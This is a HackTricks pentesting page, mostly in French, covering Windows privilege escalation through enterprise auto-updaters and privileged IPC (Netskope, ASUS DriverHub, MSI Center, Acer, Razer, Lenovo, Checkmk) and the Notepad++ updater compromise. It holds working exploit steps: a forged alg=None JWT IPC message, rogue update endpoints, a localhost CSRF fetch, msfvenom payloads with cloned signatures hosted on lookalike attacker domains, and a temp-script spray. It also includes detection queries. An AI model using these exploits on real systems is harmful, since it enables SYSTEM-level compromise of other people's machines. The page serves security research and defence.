# Abus de Enterprise Auto-Updaters et de Privileged IPC (par ex., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Cette page généralise une classe de chaînes Windows local privilege escalation trouvées dans des agents endpoint d’entreprise et des updaters qui exposent une surface IPC peu contraignante et un flux de mise à jour privilégié. Un exemple représentatif est Netskope Client for Windows < R129 (CVE-2025-0309), où un utilisateur à faible privilège peut contraindre l’enrôlement vers un serveur contrôlé par l’attaquant puis livrer un MSI malveillant que le service SYSTEM installe.

Idées clés que vous pouvez réutiliser contre des produits similaires :
- Abuse d’un localhost IPC d’un service privilégié pour forcer le ré-enrôlement ou la reconfiguration vers un serveur attaquant.
- Implémentez les endpoints de mise à jour du vendor, livrez un Trusted Root CA rogue, et pointez l’updater vers un package malveillant, “signed”.
- Contournez les vérifications faibles de signer (CN allow-lists), les drapeaux de digest optionnels, et les propriétés MSI laxistes.
- Si l’IPC est “encrypted”, dérivez la key/IV à partir d’identifiants machine lisibles par tous stockés dans le registry.
- Si le service restreint les appelants par image path/process name, injectez-vous dans un process allow-listed ou lancez-en un en état suspended et initialisez votre DLL via un patch minimal du thread-context.

---
## 1) Forcer l’enrôlement vers un serveur attaquant via localhost IPC

Beaucoup d’agents embarquent un process UI en mode user qui communique avec un service SYSTEM via localhost TCP en utilisant JSON.

Observé dans Netskope :
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flux d’exploitation :
1) Fabriquez un jeton d’enrôlement JWT dont les claims contrôlent le backend host (par ex., AddonUrl). Utilisez alg=None afin qu’aucune signature ne soit requise.
2) Envoyez le message IPC invoquant la commande de provisioning avec votre JWT et le nom du tenant :
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Le service commence à contacter votre rogue server pour l’inscription/config, par ex. :
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes :
- Si la vérification de l’appelant est basée sur le path/nom, faites partir la requête d’un binaire vendor allow-listed (voir §4).

---
## 2) Hijacking le canal de mise à jour pour exécuter du code en tant que SYSTEM

Une fois que le client parle à votre serveur, implémentez les endpoints attendus et orientez-le vers un MSI attaquant. Séquence typique :

1) /v2/config/org/clientconfig → Retournez une config JSON avec un intervalle updater très court, par ex. :
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retourne un certificat CA PEM. Le service l’installe dans le magasin Local Machine Trusted Root.
3) /v2/checkupdate → Fournir des métadonnées pointant vers un MSI malveillant et une fausse version.

Bypassing common checks seen in the wild:
- Signer CN allow-list: le service peut seulement vérifier que le Subject CN est égal à “netSkope Inc” ou “Netskope, Inc.”. Votre rogue CA peut émettre un leaf avec ce CN et signer le MSI.
- CERT_DIGEST property: inclure une propriété MSI bénigne nommée CERT_DIGEST. Aucune enforcement à l’installation.
- Optional digest enforcement: le flag de config (par ex. check_msi_digest=false) désactive la validation cryptographique supplémentaire.

Result: le service SYSTEM installe votre MSI depuis
C:\ProgramData\Netskope\stAgent\data\*.msi
exécutant du code arbitraire en tant que NT AUTHORITY\SYSTEM.

Patch-bypass lesson: si un vendor répond en allow-listant un petit ensemble de domaines “trusted” au lieu d’authentifier cryptographiquement la source de mise à jour, cherchez des redirecteurs appartenant au vendor ou des reverse proxies qui vous permettent encore d’orienter le trafic. Dans le cas de Netskope, des recherches de suivi publiques ont montré qu’un allow-list de l’ère R129 pouvait encore être abusé via `rproxy.goskope.com`, qui relayait du contenu Azure App Service contrôlé par l’attaquant. Traitez les hostname allow-lists comme un ralentisseur, pas comme une trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

Depuis R127, Netskope enveloppait le JSON IPC dans un champ encryptData qui ressemble à du Base64. Le reverse engineering a montré un AES avec une key/IV dérivée de valeurs de registre lisibles par n’importe quel user :
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Les attackers peuvent reproduire le chiffrement et envoyer des commandes chiffrées valides depuis un standard user. Conseil général : si un agent “encrypts” soudainement son IPC, cherchez des device IDs, des GUID de produit, des install IDs sous HKLM comme matériel.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Certains services essaient d’authentifier le peer en résolvant le PID de la connexion TCP et en comparant le chemin/nom de l’image aux binaries vendor allow-listed situés sous Program Files (par ex. stagentui.exe, bwansvc.exe, epdlp.exe).

Deux bypasses pratiques :
- DLL injection dans un processus allow-listed (par ex. nsdiag.exe) et proxy IPC depuis l’intérieur.
- Lancer un binary allow-listed suspendu et bootstrap votre proxy DLL sans CreateRemoteThread (voir §5) pour satisfaire les driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Les produits livrent souvent un driver minifilter/OB callbacks (par ex. Stadrv) pour retirer les droits dangereux des handles vers les processus protégés :
- Process: supprime PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: limite à THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader user-mode fiable qui respecte ces contraintes :
1) CreateProcess d’un binary vendor avec CREATE_SUSPENDED.
2) Obtenir les handles auxquels vous avez encore droit : PROCESS_VM_WRITE | PROCESS_VM_OPERATION sur le process, et un thread handle avec THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou seulement THREAD_RESUME si vous patch code à un RIP connu).
3) Écraser ntdll!NtContinue (ou un autre thunk précoce, garanti mappé) avec un petit stub qui appelle LoadLibraryW sur le path de votre DLL, puis revient.
4) ResumeThread pour déclencher votre stub in-process, chargeant votre DLL.

Parce que vous n’avez jamais utilisé PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME sur un process déjà protégé (vous l’avez créé), la policy du driver est satisfaite.

---
## 6) Practical tooling
- NachoVPN (plugin Netskope) automatise un rogue CA, la signature d’un MSI malveillant, et sert les endpoints nécessaires : /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope est un client IPC custom qui fabrique des messages IPC arbitraires (optionnellement chiffrés AES) et inclut l’injection de process suspendu pour provenir d’un binary allow-listed.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Lorsqu’on fait face à un nouvel endpoint agent ou à une suite “helper” de motherboard, un workflow rapide suffit généralement à déterminer si vous avez affaire à une cible de privesc prometteuse :

1) Énumérer les listeners loopback et les rattacher aux processes vendor :
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Énumérer les named pipes candidates :
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Extraire les données de routage appuyées par le registre utilisées par les serveurs IPC basés sur des plugins:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extraire d'abord les noms des endpoints, les clés JSON et les IDs de commande depuis le client en user-mode. Les frontends Electron/.NET packés divulguent fréquemment le schéma complet :
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Cherchez le prédicat de confiance réel, pas seulement le chemin de code qui finit par lancer le processus :
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patterns worth prioritizing:
- `CryptQueryObject`/certificate parsing without `WinVerifyTrust` usually means “certificate exists” was treated as “certificate is trusted”, enabling certificate cloning or other fake-signer tricks.
- Substring/suffix checks over `Origin`, `Referer`, download URLs, process names, or signer CNs are not authentication. `contains(".vendor.com")` is usually exploitable with attacker-controlled lookalike domains.
- If the low-privileged GUI decides “the file is trusted” and the SYSTEM broker merely consumes that result, patching or reimplementing the client-side DLL/JS often bypasses the boundary entirely (Razer-style split validation).
- If the broker copies a payload to `%TEMP%`/`C:\Windows\Temp` and then validates or schedules it from that path, immediately test for TOCTOU replacement windows and for sibling plugin modules that expose alternate `ExecuteTask()` wrappers with weaker checks.

For named-pipe-heavy targets, PipeViewer is a quick way to spot weak DACLs and remotely reachable pipes before you start reversing the protocol in depth.

If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 8) Brokers d’add-ins modulaires authentifiés uniquement par des signatures de vendor (Lenovo Vantage pattern)

Une variation plus récente à rechercher est le **signed-client RPC broker** : un processus desktop Lenovo signé et à faible privilège communique avec un service SYSTEM, et le service route des commandes JSON vers un ensemble d’add-ins décrits en XML sous `%ProgramData%`. Une fois l’exécution de code obtenue **dans n’importe quel client signé accepté**, chaque contrat `runas="system"` fait partie de votre surface d’attaque.

Primitives à forte valeur observées dans la recherche sur Lenovo Vantage :
- **Faire confiance à l’appelant parce qu’il est signé par le vendor** : des chercheurs ont obtenu un contexte authentifié en copiant un EXE signé Lenovo dans un répertoire inscriptible et en satisfaisant un DLL side-load (`profapi.dll`) afin que du code arbitraire s’exécute dans un client déjà approuvé par le service.
- **Découverte de la surface d’attaque pilotée par manifeste** : les add-ins sont déclarés sous `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` ; plusieurs contrats s’exécutent en `SYSTEM`, donc l’énumération de ces manifests révèle souvent les véritables verbes privilégiés plus vite que l’ingénierie inverse du broker lui-même.
- **Bugs par commande derrière le canal authentifié** : une fois à l’intérieur du client de confiance, la recherche publique a trouvé des path-traversal + race conditions dans des verbes d’update/install, un abus de raw-SQL dans des bases de données de paramètres privilégiés, et des vérifications de chemins de registre basées sur des sous-chaînes qui permettaient des écritures en dehors de la ruche prévue.

Recon utile sur une cible :
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Practical takeaway: whenever a helper suite exposes a broker that first authenticates the **caller process** and only then dispatches into dozens of plugin/add-in commands, do not stop after bypassing the front-door trust check. Dump the manifest/contract table and fuzz each high-privilege verb independently; the authenticated channel usually hides several second-stage bugs.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Même l’interface PowerShell CLI montrée ci-dessous réussit lorsque l’en-tête Origin est usurpé avec la valeur de confiance :
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` télécharge des exécutables arbitraires définis dans le corps JSON et les met en cache dans `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validation de l’URL de téléchargement réutilise la même logique de sous-chaîne, donc `http://updates.asus.com.attacker.tld:8000/payload.exe` est acceptée. Après le téléchargement, ADU.exe vérifie seulement que le PE contient une signature et que la chaîne Subject correspond à ASUS avant de l’exécuter – aucun `WinVerifyTrust`, aucune validation de chaîne.

Pour weaponize the flow :
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Le service SYSTEM de MSI Center expose un protocole TCP où chaque frame est `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Le composant principal (Component ID `0f 27 00 00`) fournit `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Son handler :
1) Copie l’exécutable fourni vers `C:\Windows\Temp\MSI Center SDK.exe`.
2) Vérifie la signature via `CS_CommonAPI.EX_CA::Verify` (le sujet du certificat doit être égal à “MICRO-STAR INTERNATIONAL, CO., LTD.” et `WinVerifyTrust` doit réussir).
3) Crée une tâche planifiée qui exécute le fichier temporaire en tant que SYSTEM avec des arguments contrôlés par l’attaquant.

Le fichier copié n’est pas verrouillé entre la vérification et `ExecuteTask()`. Un attaquant peut :
- Envoyer Frame A pointant vers un binaire légitime signé MSI (garantit que la vérification de signature passe et que la tâche est mise en file d’attente).
- Le concurrencer avec des messages Frame B répétés qui pointent vers un payload malveillant, en écrasant `MSI Center SDK.exe` juste après la fin de la vérification.

Quand le scheduler se déclenche, il exécute le payload écrasé sous SYSTEM malgré la validation du fichier original. Une exploitation fiable utilise deux goroutines/threads qui spamment CMD_AutoUpdateSDK jusqu’à gagner la fenêtre TOCTOU.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Chaque plugin/DLL chargé par `MSI.CentralServer.exe` reçoit un Component ID stocké sous `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Les 4 premiers bytes d’une frame sélectionnent ce composant, ce qui permet aux attaquants d’acheminer des commandes vers des modules arbitraires.
- Les plugins peuvent définir leurs propres task runners. `Support\API_Support.dll` expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` et appelle directement `API_Support.EX_Task::ExecuteTask()` sans **aucune** validation de signature – n’importe quel utilisateur local peut le pointer vers `C:\Users\<user>\Desktop\payload.exe` et obtenir une exécution SYSTEM déterministe.
- Sniffer le loopback avec Wireshark ou instrumenter les binaires .NET dans dnSpy révèle rapidement le mapping Component ↔ command ; des clients Go/ Python personnalisés peuvent ensuite rejouer les frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expose `\\.\pipe\treadstone_service_LightMode`, et son ACL discrétionnaire autorise des clients distants (par ex. `\\TARGET\pipe\treadstone_service_LightMode`). Envoyer l’ID de commande `7` avec un chemin de fichier invoque la routine de lancement de processus du service.
- La bibliothèque client sérialise un octet terminateur magique (113) avec les args. L’instrumentation dynamique avec Frida/`TsDotNetLib` (voir [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) pour des conseils d’instrumentation) montre que le handler natif mappe cette valeur vers un `SECURITY_IMPERSONATION_LEVEL` et un SID d’intégrité avant d’appeler `CreateProcessAsUser`.
- Remplacer 113 (`0x71`) par 114 (`0x72`) bascule dans la branche générique qui conserve le jeton SYSTEM complet et définit un SID d’intégrité élevé (`S-1-16-12288`). Le binaire lancé s’exécute donc en SYSTEM non restreint, à la fois localement et à distance.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 a ajouté un autre schéma utile à cette famille : un utilisateur à faible privilège peut demander à un helper COM de lancer un processus via `RzUtility.Elevator`, tandis que la décision de confiance est déléguée à une DLL en user-mode (`simple_service.dll`) au lieu d’être appliquée de manière robuste à l’intérieur de la frontière privilégiée.

Chemin d’exploitation observé :
- Instancier l’objet COM `RzUtility.Elevator`.
- Appeler `LaunchProcessNoWait(<path>, "", 1)` pour demander un lancement élevé.
- Dans le PoC public, la porte de vérification de signature PE dans `simple_service.dll` est patchée avant l’envoi de la requête, ce qui permet de lancer un exécutable arbitraire choisi par l’attaquant.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Prise principale : lors du reverse engineering de suites « helper », ne vous arrêtez pas à localhost TCP ou aux named pipes. Vérifiez les COM classes avec des noms comme `Elevator`, `Launcher`, `Updater`, ou `Utility`, puis confirmez si le service privilégié valide réellement le binaire cible lui-même ou s’il fait simplement confiance à un résultat calculé par une DLL client user-mode patchable. Ce pattern s’étend au-delà de Razer : toute conception split où le broker à haut privilège consomme une décision allow/deny provenant de la partie low-privilege est une candidate privesc surface.


---
## Exécution prévisible d’un script temp pendant la réparation MSI (Checkmk Agent / CVE-2024-0670)

Certains agents Windows implémentent encore des actions privilégiées en écrivant un `.cmd` temporaire dans `C:\Windows\Temp` puis en l’exécutant en tant que `SYSTEM`. Si le nom de fichier est prévisible et que le service ne recrée pas les fichiers existants de manière sûre, un utilisateur low-privilege peut pré-créer le futur fichier temp en **lecture seule** et faire exécuter au processus privilégié du contenu contrôlé par l’attaquant à la place de son propre script.

Observé dans les versions vulnérables de Checkmk Agent :
- pattern temp : `cmk_all_<PID>_1.cmd`
- branches affectées : `2.0.0`, `2.1.0`, `2.2.0`
- déclencheur : réparation MSI **repair** du package agent mis en cache

Workflow pratique :
1. Estimez une plage réaliste de PID à partir des PID des processus actuels ou du PID de l’agent en cours d’exécution.
2. Écrivez un payload `.cmd` court en **ASCII** (`Set-Content -Encoding Ascii` ou redirection `cmd.exe`; évitez la sortie PowerShell UTF-16 pour les fichiers batch).
3. Saupoudrez `C:\Windows\Temp\cmk_all_<PID>_1.cmd` sur la plage candidate et marquez chaque fichier en lecture seule.
4. Déclenchez une réparation du MSI mis en cache afin que le service privilégié tente de régénérer puis exécute le script temp.
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Si le produit vulnérable est installé avec Windows Installer, mappez le MSI mis en cache au nom aléatoire dans `C:\Windows\Installer` vers son nom de produit avant de déclencher la réparation :
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operational notes:
- `qwinsta` est utile lorsque `msiexec /fa` échoue depuis un shell WinRM non interactif et que vous devez comprendre si une session de bureau existante/déconnectée peut déclencher correctement la réparation.
- Ce pattern se généralise à d’autres endpoint agents et updaters qui **staged des scripts temp dans des emplacements world-writable puis les exécutent ensuite en tant que SYSTEM**. Testez les noms prédictibles, l’absence de sémantique de création exclusive, et les flows de repair/update qui peuvent être déclenchés à la demande.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Entre juin 2025 et décembre 2025, des attackers ayant compromis l’infrastructure d’hébergement derrière le flux d’update de Notepad++ ont servi sélectivement des manifests malveillants à des victimes choisies. Les anciens updaters basés sur WinGUp ne vérifiaient pas complètement l’authenticité des updates, donc une réponse XML hostile pouvait rediriger les clients vers des URLs contrôlées par l’attaquant. Parce que le client acceptait du contenu HTTPS sans imposer à la fois une chaîne de certificats de confiance et une signature PE valide sur l’installer téléchargé, les victimes ont téléchargé et exécuté un `update.exe` NSIS trojanized.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromettre le CDN/hosting et répondre aux checks d’update avec des metadata d’attaquant pointant vers une URL de téléchargement malveillante.
2. **Trojanized NSIS**: l’installer récupère/exécute un payload et abuse de deux execution chains :
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` et déposer un `log.dll` malveillant dans son search path. Lorsque le signed binary s’exécute, Windows sideloads `log.dll`, qui déchiffre et charge de manière reflective la backdoor Chrysalis (protégée par Warbird + API hashing pour gêner la détection statique).
- **Scripted shellcode injection**: NSIS exécute un script Lua compilé qui utilise des Win32 APIs (p. ex. `EnumWindowStationsW`) pour injecter du shellcode et stager Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Imposer la **vérification de certificat + signature** de l’installer téléchargé (pin the vendor signer, rejeter les CN/chain non correspondants) et signer le update manifest lui-même (p. ex. XMLDSig). Bloquer les redirects contrôlés par le manifest sauf s’ils sont validés.
- Traiter le **BYO signed binary sideloading** comme un point de pivot de détection post-download : alerter lorsqu’un signed vendor EXE charge un nom de DLL provenant de l’extérieur de son canonical install path (p. ex. Bitdefender chargeant `log.dll` depuis Temp/Downloads) et lorsqu’un updater dépose/exécute des installers depuis temp avec des signatures non-vendor.
- Surveiller les **malware-specific artifacts** observés dans cette chaîne (utiles comme generic pivots) : mutex `Global\Jdhfv_1.0.1`, écritures anormales de `gup.exe` vers `%TEMP%`, et les stages d’injection de shellcode pilotés par Lua.
- Notepad++ a réagi en renforçant WinGUp dans v8.8.9 et versions ultérieures : le XML renvoyé est désormais signé (XMLDSig), et les versions plus récentes imposent la vérification de certificat + signature de l’installer téléchargé au lieu de se fier uniquement au transport.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> lançant un installateur autre que Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ces patterns se généralisent à tout updater qui accepte des manifests non signés ou qui ne fixe pas les signers de l’installer — hijack du réseau + malicious installer + sideloading BYO-signed permet une remote code execution sous couvert de mises à jour « trusted ».

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
